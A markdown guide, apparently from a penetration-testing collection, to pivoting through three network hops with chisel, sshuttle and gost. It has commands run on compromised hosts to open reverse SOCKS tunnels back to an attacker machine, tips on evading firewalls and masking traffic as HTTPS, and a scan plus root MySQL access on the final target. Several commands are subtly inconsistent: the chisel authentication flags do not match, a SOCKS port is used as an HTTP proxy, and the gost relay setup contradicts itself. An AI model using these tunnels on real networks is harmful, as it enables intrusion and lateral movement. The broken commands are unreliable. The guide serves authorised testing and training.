# Pivoting-guide
Guide to Pivoting with sshuttle, gost and chisel
## General network diagram for examples

Attacker (Kali, 1.1.1.1)
│
└── Hop 1: Web server (10.0.0.5, accessible from the Internet)
│
└── Hop 2: Internal host (192.168.1.10, accessible only from 10.0.0.0/24)
│
└── Hop 3: Target server (172.16.0.20, accessible only from 192.168.1.0/24)

---
# 1. Pivoting via Chisel (HTTP tunnels)

**How ​​it works:**
- **Tunneling via HTTP/HTTPS**, similar to SSH, but works as a reverse proxy.
- The client connects to the server and opens **SOCKS5 or ports** to access the inside network.
- Suitable for **bypassing firewalls**, as it uses standard ports (80, 443).

**Example command:**
On the server (attacker):
```
chisel server --port 8080 --reverse
```
On the victim:
```
chisel client <SERVER_IP>:8080 R:socks
```
- `R:socks` — creates a SOCKS5 proxy on the server.
**When to use?**
- Need a **fast SOCKS proxy** without complex configuration.
- Traffic should go **via HTTP/HTTPS** (for example, if SSH is blocked).

### **Step 1: Setting up Chisel server on Kali**
**On the attacking machine (1.1.1.1)**
```
chisel server -v --port 8080 --reverse --key supersecret
```
- `--reverse`: allow reverse connections
- `--key`: secret key for authentication
- `-v`: verbose mode for debugging

### **Step 2: First hop (Kali → Web server)**
**On the web server (10.0.0.5)**:
```
./chisel client -v --auth user:pass 1.1.1.1:8080 R:1080:socks
```
- `R:1080:socks`: create a SOCKS5 proxy on port 1080 Kali, connecting to the chisel server on port 8080.
**Checking:**
```
curl --socks5-hostname 127.0.0.1:1080 http://10.0.0.5/internal-status
```

### **Step 3: Second Hop (Web Server → Internal Host)**
**On the internal host (192.168.1.10)**:
Via the first hop SOCKS proxy (10.0.0.5:1080)
```
./chisel client -v --auth user:pass --proxy http://10.0.0.5:1080 1.1.1.1:8080 R:1081:socks
```
- `--proxy`: use the first hop proxy
- `R:1081:socks`: new port 1081 on Kali for 2nd hop
**Check:**
```
curl --socks5-hostname 127.0.0.1:1081 http://192.168.1.10/secrets
```

### **Step 4: Third Hop (Internal Host → Target Server)**
**On Target Server (172.16.0.20)**:
```
./chisel client -v --auth user:pass --proxy http://192.168.1.10:1081 1.1.1.1:8080 R:1082:socks
```
- `R:1082:socks`: port 1082 on Kali for 3rd hop

**Result:**
via `127.0.0.1:1082` network 172.16.0.0/24 is available on Kali
via `127.0.0.1:1081` network 192.168.1.0/24 is available on Kali
via `127.0.0.1:1080 network 10.0.0.0/24 is available on Kali
---
# 2. Pivoting via SSHuttle (SSH-VPN)

**How ​​it works:**
- **"VPN over SSH"** — routes traffic through an SSH tunnel without configuring a VPN.
- Automatically **forwards subnets** through the specified SSH server.
- Does not require rights on the remote machine (unlike a full-fledged VPN).

**Example command:**
```
sshuttle -r user@jump-server 192.168.1.0/24
```
- `-r` — SSH server to jump to.
- `192.168.1.0/24` — subnet that will go through the tunnel.

**When to use?**
- You need **transparent access** to the internal network (like a VPN, but simpler).
- Already have **SSH access** to the jump server.

### **Step 1: First Hop (Kali → Web Server)**
**Kali Command:**
```
sshuttle -r user@10.0.0.5 10.0.0.0/24 -e "ssh -i ~/.ssh/jump1_key"
```
- `-r user@10.0.0.5`: SSH connection to the first hop.
- `10.0.0.0/24`: routable subnet.
- `-e`: specifies the SSH command with the key.
**Where executed:**
The command is run on Kali. Traffic for 10.0.0.0/24 goes through the Web Server.

### **Step 2: Second Hop (Web Server → Internal Host)**
**Kali Command:**
```
sshuttle -r user@192.168.1.10 192.168.1.0/24 \
--ssh-cmd "ssh -i ~/.ssh/jump2_key -J user@10.0.0.5"
```
- `-J user@10.0.0.5`: jump via first host (SSH ProxyJump).
- `192.168.1.0/24`: second hop routable subnet.
**Where executed:**
Command is run on Kali. Traffic for 192.168.1.0/24 goes via Internal Host.

### **Step 3: Third Hop (Internal Host → Target Server)**
**Kali Command:**
```
sshuttle -r user@172.16.0.20 172.16.0.0/24 \
--ssh-cmd "ssh -i ~/.ssh/target_key -J user@192.168.1.10"
```
- `-J user@192.168.1.10`: Hop via the second host.
- `172.16.0.0/24`: The final target subnet.

**Result:**
All traffic for 172.16.0.0/24 goes through the chain: Kali → Web Server → Internal Host → Target Server.

---
# 3. Pivoting via Gost (Multiprotocol tunnels)

**How ​​it works:**
- **Multifunctional proxy server** that supports multiple protocols (HTTP/HTTPS, SOCKS5, WebSocket, TLS, SSH, etc.).
- Works according to the **"relay" (proxy chain)** scheme: traffic passes through several nodes in sequence.
- Can **mask traffic** (for example, as HTTPS or WebSocket).

**Example command:**
```
gost -L "socks5://:1080" -F "relay+tls://jump-server:443"
```
- `-L` — listens to a local SOCKS5 proxy.
- `-F` — specifies the next hop (for example, via TLS).

**When to use?**
- Need **flexibility** (different protocols).
- Traffic must be **masked** (like HTTPS, for example).
### **Scenario:**
Kali (1.1.1.1) → [jump1:10.0.0.5] → [jump2:192.168.1.10] → [target:172.16.0.20]

### **Step 1: First hop (Kali → Web server)**

**Kali command:**
```
gost -L "socks5://:1080"
```
- `-L "socks5://:1080"`: starts a SOCKS5 server on port 1080.

**Web server command (10.0.0.5):**
```
gost -L "relay://:8443?ip=1.1.1.1&port=1080"
```
- `relay://:8443`: relay forwards traffic to Kali (1.1.1.1:1080).

### **Step 2: Second Hop (Web Server → Internal Host)**
**Command on Internal Host (192.168.1.10):**
```
gost -L "relay+tls://:443?ip=10.0.0.5&port=8443"
```
- `relay+tls://:443`: TLS encrypted relay, connects to first hop (10.0.0.5:8443).

### **Step 3: Third Hop (Internal Host → Target Server)**
**Command on Target Server (172.16.0.20):**
```
gost -L "relay+ws://:80?ip=192.168.1.10&port=443"
```
- `relay+ws://:80`: relay via WebSocket, connects to second hop (192.168.1.10:443).

### **Building the chain on Kali:**
```
gost -L :3306 \
-F "forward+ssh://user@10.0.0.5:22" \
-F "relay+tls://192.168.1.10:443" \
-F "relay+ws://172.16.0.20:80"
```
- `-L :3306`: forwards port 3306 to Kali.
- `-F`: defines the hop chain:
1. SSH tunnel to 10.0.0.5.
2. TLS relay to 192.168.1.10.
3. WebSocket relay to 172.16.0.20.

**MySQL access on target server:**
```
mysql -h 127.0.0.1 -P 3306 -u root -p
```
## Possible problems and solutions

### 1. **Problem: No route to target network**
**Symptoms:**
`No route to host`, packets are lost after the first hop.
**Solution:**
Add a static route on Kali:
```
sudo ip route add 172.16.0.0/24 via 10.0.0.5
```

Or use `proxychains`:
```
proxychains nmap -sT -p 22,80,443 172.16.0.20
```

### 2. **Problem: SSH ports are blocked**
**Symptoms:**
Timeouts when connecting to port 22.
**Workaround:**
Use port 443 for SSH:
```
sshuttle -r user@10.0.0.5:443 10.0.0.0/24
```

Or set up an SSH server to hop to non-standard ports.

### 3. **Problem: Authentication errors**
**Symptoms:**
`Permission denied (publickey)` or `Auth failed`.
**SSH solution:**
- Make sure keys are added to `authorized_keys` on each hop:
```
ssh-copy-id -i ~/.ssh/jump1_key user@10.0.0.5
```
- For Gost, use authentication parameters:
```
gost -L "socks5://user:pass@:1080"
```
### 4. **Problem: Unstable connections**
**Symptoms:**
Tunnels drop after a few minutes.
**Solution:**
- For Chisel use `--keepalive`:
```
chisel client --keepalive 30s ...
```
- For Gost set timeouts:
```
gost -L "relay+tls://:443?ip=10.0.0.5&port=8443&timeout=30s"
```

---
## Debugging checklist
1. **Check connectivity:**
Via Chisel
```
proxychains curl http://172.16.0.20
```
Via SSHuttle
```
traceroute -T 172.16.0.20
```
Via Gost
```
gost -L :8080 -F "relay+ws://172.16.0.20:80" && curl http://127.0.0.1:8080
```
2. **Analyze logs:**
- For Chisel: add `-v` to commands.

- For Gost: run with `-logtostderr`.
3. **Check firewall rules:**
```
sudo iptables -L -n -v # On hops
```
---

## Important nuances

1. **Encryption:**
- Always use TLS/SSL in Gost (`relay+tls://` instead of `relay://`).
- For SSH, use ED25519 keys instead of RSA.

2. **Stealth:**
- Mask traffic as HTTPS (port 443).
- Use obfuscation in Gost: `relay+ws://` + TLS.
# **Automation:**
Create bash scripts for quick chain deployment:
# Chisel example
```
#!/bin/bash
chisel server --port 8080 --reverse &
sleep 2
ssh user@10.0.0.5 "./chisel client 1.1.1.1:8080 R:socks"
```
---

## Conclusion

Each tool has its own strengths:

- **Chisel** — simplicity and speed.

- **SSHuttle** — SSH integration and automatic routing.

- **Gost** — flexibility and support for multiple protocols.
